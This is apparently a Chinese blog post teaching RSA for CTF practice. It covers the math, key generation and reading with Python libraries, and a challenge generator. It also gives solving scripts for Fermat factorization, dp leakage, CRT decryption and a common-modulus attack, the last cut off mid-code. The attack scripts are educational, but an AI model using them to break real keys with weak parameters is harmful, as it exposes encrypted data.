<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">选择两个大素数p和q，计算出模数N = p*q</span><br><span class="line">计算φ(n) = （p-1) * (q-1)即N的欧拉函数，然后选择一个e(1&lt;e&lt;φ(n)),且e和φ(n)互素</span><br><span class="line"></span><br><span class="line">取e的模反数为d（逆元），计算方法：e * d ≡ 1(mod φ(n))</span><br><span class="line"></span><br><span class="line">对明文进行加密： c = m^e%N</span><br><span class="line">c = pow(m,e,N),得到c即为密文</span><br><span class="line"></span><br><span class="line">对密文c进行解密 ：m = c^d%N</span><br><span class="line">m = pow(c,d,N),得到的m即为明文</span><br><span class="line"></span><br><span class="line">其中：</span><br><span class="line">	p 和 q ：大整数N的两个因子</span><br><span class="line">	N      ：大整数N，我们称之为模数</span><br><span class="line">	e 和 d ：互为模反的两个指数</span><br><span class="line">	c 和 m ：分别是密文和明文，这里一般指的是一个十进制的数</span><br></pre></td></tr></table></figure>



<h4 id="rsa算法原理"><a href="#rsa算法原理" class="headerlink" title="rsa算法原理"></a>rsa算法原理</h4><h5 id="欧拉函数φ-n"><a href="#欧拉函数φ-n" class="headerlink" title="欧拉函数φ(n)"></a>欧拉函数φ(n)</h5><p>欧拉函数φ(n)的定义是小于n的自然数中与n互质的数的个数</p>
<p>任何一个素数p的欧拉函数就是 p-1</p>
<h5 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h5><p>若n,a为正整数，且n,a互质，gcd（n,a）&#x3D; 1 , 则:a^φ(n)≡1 mod n</p>
<h5 id="费马小定理"><a href="#费马小定理" class="headerlink" title="费马小定理"></a>费马小定理</h5><p>   <img src="/2023/06/11/%E5%AF%86%E7%A0%81/Users\tong\Pictures\费马小定理.png"></p>
<p>模运算<br>模运算与基本四则运算有些相似，但是除法除外。其规则如下：</p>
<p>(a + b) % p &#x3D; (a % p + b % p) % p<br>(a - b) % p &#x3D; (a % p - b % p) % p<br>(a * b) % p &#x3D; (a % p * b % p) % p<br>a ^ b % p &#x3D; ((a % p) ^ b) % p<br>结合律<br>((a + b) % p + c) &#x3D; (a + (b + c) % p) % p<br>((a * b) % p * c) &#x3D; (a * (b * c) % p) % p<br>交换律<br>(a + b) % p &#x3D; (b + a) % p<br>(a * b) % p &#x3D; (b * a) % p<br>分配律<br>(a + b) % p &#x3D; (a % p + b % p) % p<br>((a + b) % p * c) % p &#x3D; ((a * c) % p + (b * c) % p<br>重要定理<br>若 a ≡ b (mod p)，则对于任意的 c，都有(a + c) ≡ (b + c) (mod p)<br>若 a ≡ b (mod p)，则对于任意的 c，都有(a * c) ≡ (b * c) (mod p)<br>若 a ≡ b (mod p)，c ≡ d (mod p)，则<br>(a + c) ≡ (b + d) (mod p)<br>(a - c) ≡ (b - d) (mod p)<br>(a * c) ≡ (b * d) (mod p)<br>(a &#x2F; c) ≡ (b &#x2F; d) (mod p)<br>逆元<br>a mod p的逆元便是可以使 a * a’ mod p &#x3D; 1 的最小a’。</p>
<p>推导过程</p>
<p>式1：c&#x3D;m^e%N<br>式2：m&#x3D;c^d%N</p>
<p>将式1带入式2 得 m &#x3D; (m ^ e % N ) ^ d % N</p>
<p>需要证明：m &#x3D;&#x3D; ( m ^ e % N ) ^ d % N</p>
<p>(m^e%N)^d%N</p>
<p>&#x3D;&gt;  (m^e)^d%N #模运算 a ^ b % p &#x3D; ((a % p) ^ b) % p</p>
<p>m^(e*d)%N #幂的乘方，底数不变，指数相乘<br>将 e * d ≡ 1 (mod φ(N)) 即 e * d &#x3D; K * φ(N) + 1，K为任意正整数，代入得：</p>
<p>&#x3D;&gt; (m^(K*φ(N)+1))%N</p>
<p>&#x3D;&gt; (m^(K*φ(N)*m^1)%N # 同底数相乘，指数相加</p>
<p>&#x3D;&gt; (m^(K*φ(N)*m)%N</p>
<p>&#x3D;&gt; ((m^φ(N)^K%N*m)%N # 幂的乘方，底数不变，指数相乘</p>
<p>&#x3D;&gt; ((m^φ(N)^K%N*m%N)%N # (a * b) % p &#x3D; (a % p * b % p) % p</p>
<p>&#x3D;&gt; ((m^φ(N)%N)^K%N*m%N)%N # a ^ b % p &#x3D; ((a % p) ^ b) % p</p>
<p>&#x3D;&gt; (1^K%N*m%N)%N # 根据欧拉定理：a^φ(n)≡1 mod n 即 a^φ(n) mod n &#x3D; 1</p>
<p>&#x3D;&gt; (m%N)%N # 1^K%N&#x3D;1</p>
<p>&#x3D;&gt; (m%N)%N</p>
<p>&#x3D;&gt; (m%N)^1%N</p>
<p>&#x3D;&gt; (m^1)%N   # a ^ b % p &#x3D; ((a % p) ^ b) % p</p>
<p>&#x3D;&gt; m%N</p>
<p>m  #因为 m &lt; N</p>
<h3 id="Crypto-PublicKey模块公私钥读取与生成"><a href="#Crypto-PublicKey模块公私钥读取与生成" class="headerlink" title="Crypto.PublicKey模块公私钥读取与生成"></a>Crypto.PublicKey模块公私钥读取与生成</h3><h4 id="公钥生成"><a href="#公钥生成" class="headerlink" title="公钥生成"></a>公钥生成</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">p= <span class="number">787228223375328491232514653709</span></span><br><span class="line">q= <span class="number">814212346998672554509751911073</span></span><br><span class="line">n= <span class="number">640970939378021470187479083920100737340912672709639557619757</span></span><br><span class="line">d= <span class="number">590103645243332826117029128695341159496883001869370080307201</span></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rsa_components = (n, e)</span><br><span class="line">keypair = RSA.construct(rsa_components)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pubckey.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f :</span><br><span class="line">    f.write(keypair.exportKey())</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="私钥生成"><a href="#私钥生成" class="headerlink" title="私钥生成"></a>私钥生成</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">p= <span class="number">787228223375328491232514653709</span></span><br><span class="line">q= <span class="number">814212346998672554509751911073</span></span><br><span class="line">n= <span class="number">640970939378021470187479083920100737340912672709639557619757</span></span><br><span class="line">d= <span class="number">590103645243332826117029128695341159496883001869370080307201</span></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rsa_components = (n,e,d,p,q)</span><br><span class="line">keypair = RSA.construct(rsa_components)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;private1.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f :</span><br><span class="line">    f.write(keypair.exportKey())</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="公钥求读取"><a href="#公钥求读取" class="headerlink" title="公钥求读取"></a>公钥求读取</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">path = <span class="string">&#x27;&lt;key file path here&gt;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.import_key(f.read())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;e = %d&#x27;</span> % key.e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;n = %d&#x27;</span> % key.n)</span><br></pre></td></tr></table></figure>



<h4 id="私钥读取"><a href="#私钥读取" class="headerlink" title="私钥读取"></a>私钥读取</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;private1.pem&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.import_key(f.read())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;n = %d&#x27;</span> % key.n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;e = %d&#x27;</span> % key.e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;d = %d&#x27;</span> % key.d)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;p = %d&#x27;</span> % key.p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;q = %d&#x27;</span> % key.q)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="rsa模块公私钥读取与生成"><a href="#rsa模块公私钥读取与生成" class="headerlink" title="rsa模块公私钥读取与生成"></a>rsa模块公私钥读取与生成</h3><h4 id="公钥生成-1"><a href="#公钥生成-1" class="headerlink" title="公钥生成"></a>公钥生成</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line">p= <span class="number">787228223375328491232514653709</span></span><br><span class="line">q= <span class="number">814212346998672554509751911073</span></span><br><span class="line">n= <span class="number">640970939378021470187479083920100737340912672709639557619757</span></span><br><span class="line">d= <span class="number">590103645243332826117029128695341159496883001869370080307201</span></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">pubkey = rsa.PublicKey(n , e )</span><br><span class="line"><span class="built_in">print</span>(pubkey)</span><br><span class="line">pub=rsa.PublicKey.save_pkcs1(pubkey)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pub.pem&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(pub)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="私钥生成-1"><a href="#私钥生成-1" class="headerlink" title="私钥生成"></a>私钥生成</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line">p= <span class="number">787228223375328491232514653709</span></span><br><span class="line">q= <span class="number">814212346998672554509751911073</span></span><br><span class="line">n= <span class="number">640970939378021470187479083920100737340912672709639557619757</span></span><br><span class="line">d= <span class="number">590103645243332826117029128695341159496883001869370080307201</span></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">prikey = rsa.PrivateKey(n , e , d , p , q)</span><br><span class="line"><span class="built_in">print</span>(prikey)</span><br><span class="line">pri=rsa.PrivateKey.save_pkcs1(prikey)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pri.pem&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(pri)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="公钥读取"><a href="#公钥读取" class="headerlink" title="公钥读取"></a>公钥读取</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;2.pem&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    keydata= f.read()</span><br><span class="line">pubckey = rsa.PublicKey.load_pkcs1(keydata)</span><br><span class="line"><span class="comment">#pubckey = rsa.PublicKey.load_pkcs1_openssl_pem(keydata)</span></span><br><span class="line"><span class="built_in">print</span>(pubckey.n)</span><br><span class="line"><span class="built_in">print</span>(pubckey.e)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="私钥读取-1"><a href="#私钥读取-1" class="headerlink" title="私钥读取"></a>私钥读取</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.pem&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    keydata= f.read()</span><br><span class="line">pubckey = rsa.PrivateKey.load_pkcs1(keydata)</span><br><span class="line"><span class="built_in">print</span>(pubckey.n)</span><br><span class="line"><span class="built_in">print</span>(pubckey.e)</span><br><span class="line"><span class="built_in">print</span>(pubckey.d)</span><br><span class="line"><span class="built_in">print</span>(pubckey.q)</span><br><span class="line"><span class="built_in">print</span>(pubckey.p)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="随机生成flag"><a href="#随机生成flag" class="headerlink" title="随机生成flag"></a>随机生成flag</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment">#字符串列表</span></span><br><span class="line">a=string.printable</span><br><span class="line"><span class="comment">#随机生成flag</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        flag += a[random.randint(<span class="number">0</span>, <span class="number">99</span>)]</span><br><span class="line">    flag = hashlib.md5(flag.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span> + flag + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="基于N分解的题目"><a href="#基于N分解的题目" class="headerlink" title="基于N分解的题目"></a>基于N分解的题目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">p=libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line"><span class="comment">#下一个素数</span></span><br><span class="line">q=<span class="built_in">int</span>(gmpy2.next_prime(p))</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">m=<span class="string">&quot;flag&#123;a272722c1db834353ea3ce1d9c71feca&#125;&quot;</span></span><br><span class="line">m=libnum.s2n(m)</span><br><span class="line">n=p*q</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">flag_c=libnum.n2s(c)</span><br><span class="line">rsa_components = (n, e)</span><br><span class="line">keypair = RSA.construct(rsa_components)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pubckey1.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f :</span><br><span class="line">    f.write(keypair.exportKey())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(flag_c)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isqrt</span>(<span class="params">n</span>):</span><br><span class="line">  x = n</span><br><span class="line">  y = (x + n // x) // <span class="number">2</span></span><br><span class="line">  <span class="keyword">while</span> y &lt; x:</span><br><span class="line">    x = y</span><br><span class="line">    y = (x + n // x) // <span class="number">2</span></span><br><span class="line">  <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fermat</span>(<span class="params">n, verbose=<span class="literal">True</span></span>):</span><br><span class="line">    a = isqrt(n) <span class="comment"># int(ceil(n**0.5))</span></span><br><span class="line">    b2 = a*a - n</span><br><span class="line">    b = isqrt(n) <span class="comment"># int(b2**0.5)</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b*b != b2:</span><br><span class="line">        <span class="comment"># if verbose:</span></span><br><span class="line">        <span class="comment">#     print(&#x27;Trying: a=%s b2=%s b=%s&#x27; % (a, b2, b))</span></span><br><span class="line">        a = a + <span class="number">1</span></span><br><span class="line">        b2 = a*a - n</span><br><span class="line">        b = isqrt(b2) <span class="comment"># int(b2**0.5)</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    p=a+b</span><br><span class="line">    q=a-b</span><br><span class="line">    <span class="keyword">assert</span> n == p * q</span><br><span class="line">    <span class="comment"># print(&#x27;a=&#x27;,a)</span></span><br><span class="line">    <span class="comment"># print(&#x27;b=&#x27;,b)</span></span><br><span class="line">    <span class="comment"># print(&#x27;p=&#x27;,p)</span></span><br><span class="line">    <span class="comment"># print(&#x27;q=&#x27;,q)</span></span><br><span class="line">    <span class="comment"># print(&#x27;pq=&#x27;,p*q)</span></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pubckey1.pem&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.import_key(f.read())</span><br><span class="line">    n=key.n</span><br><span class="line">    e=key.e</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    c=f.read()</span><br><span class="line">    c=libnum.s2n(c)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#费马分解,</span></span><br><span class="line">n1=fermat(n)</span><br><span class="line">p=n1[<span class="number">0</span>]</span><br><span class="line">q=n1[<span class="number">1</span>]</span><br><span class="line">phi_n=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="comment">#求逆元</span></span><br><span class="line">d=libnum.invmod(e,phi_n)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="已知p-q-dp-dq-c求密文"><a href="#已知p-q-dp-dq-c求密文" class="headerlink" title="已知p q dp dq c求密文"></a>已知p q dp dq c求密文</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">p=</span><br><span class="line">q=</span><br><span class="line">dp=</span><br><span class="line">dq=</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">I = gmpy2.invert(q,p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c,dp,p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c,dq,q)               <span class="comment">#求幂取模运算</span></span><br><span class="line"></span><br><span class="line">m = (((mp-mq)*I)%p)*q+mq       <span class="comment">#求明文公式</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m))          <span class="comment">#转为十六进制</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="dp泄露"><a href="#dp泄露" class="headerlink" title="dp泄露"></a>dp泄露</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e):                   <span class="comment">#在范围(1,e)之间进行遍历</span></span><br><span class="line">    <span class="keyword">if</span>(dp*e-<span class="number">1</span>)%i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n%(((dp*e-<span class="number">1</span>)//i)+<span class="number">1</span>) == <span class="number">0</span>:   <span class="comment">#存在p，使得n能被p整除</span></span><br><span class="line">            p=((dp*e-<span class="number">1</span>)//i)+<span class="number">1</span></span><br><span class="line">            q=n//(((dp*e-<span class="number">1</span>)//i)+<span class="number">1</span>)</span><br><span class="line">            phi=(q-<span class="number">1</span>)*(p-<span class="number">1</span>)            <span class="comment">#欧拉定理</span></span><br><span class="line">            d=gp.invert(e,phi)         <span class="comment">#求模逆</span></span><br><span class="line">            m=<span class="built_in">pow</span>(c,d,n)               <span class="comment">#快速求幂取模运算</span></span><br><span class="line">           </span><br><span class="line"><span class="built_in">print</span>(m)                               <span class="comment">#10进制明文</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])                      <span class="comment">#16进制明文</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))       <span class="comment">#16进制转文本</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum </span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="comment"># 欧几里得算法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">  n = <span 